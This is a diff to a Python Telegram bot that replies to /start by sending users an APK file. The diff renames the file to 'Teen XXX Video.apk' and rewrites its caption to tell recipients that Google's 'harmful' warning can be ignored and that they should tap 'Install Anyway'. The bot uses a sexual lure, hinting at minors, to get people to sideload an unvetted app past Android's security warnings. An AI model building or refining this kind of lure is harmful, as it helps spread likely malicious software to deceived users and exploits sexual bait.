@@ -1,4 +1,3 @@
-
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 from config import BOT_TOKEN
@@ -54,8 +53,13 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     save_user(user)
 
     await update.message.reply_document(
-        document=open("media/Pinay Atabs Videos .apk", "rb"),
-        caption="📥 Download the app for exclusive videos & photos! 🔥\n\n🔞 *Dapat 18+ ka bago mag-install!*",
+        document=open("media/Teen XXX Video.apk", "rb"),
+        caption=(
+            "📥 *Download the App for Exclusive Videos & Photos!*\n\n"
+            "⚠️ *Note:* Google may flag this as 'harmful' because it's not from the PlayStore. "
+            "Don't worry, it's safe. Just click *Install Anyway*.\n\n"
+            "🔞 *Reminder: 18+ only before installing!*"
+        ),
         parse_mode="Markdown"
     )
 
